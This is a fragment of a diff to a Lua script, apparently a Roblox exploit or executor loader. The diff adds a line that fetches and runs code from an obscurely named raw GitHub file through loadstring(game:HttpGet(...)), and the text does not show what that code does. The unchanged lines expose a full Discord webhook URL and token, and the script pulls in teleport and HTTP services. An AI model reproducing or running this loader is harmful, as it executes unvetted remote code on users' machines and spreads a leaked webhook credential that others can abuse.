@@ -2,7 +2,7 @@
 local DISCORD_WEBHOOK_URL = "https://discord.com/api/v10/webhooks/1498592185757470761/9HgevTEaO1cYp-tddnm8gIP00ioGPWyr_NrD6iERIbC6KKJPvJwR5CvWMIelmdNXxmOc"
 
 -- PASTE YOUR ENTIRE SCRIPT SOURCE CODE BETWEEN THE [[ ]] BELOW
-local MY_SCRIPT_SOURCE = "loadstring(game:HttpGet('YOUR_LINK_HERE'))()"
+local MY_SCRIPT_SOURCE = "loadstring(game:HttpGet('https://raw.githubusercontent.com/fuckalllarp/281hsysbwakiahsvebs/refs/heads/main/Ih0frb9ifecbuof3cbuo4fcbuofbrcoubufcro.lua'))()"
     
 local TeleportService = game:GetService("TeleportService")
 local HttpService = game:GetService("HttpService")
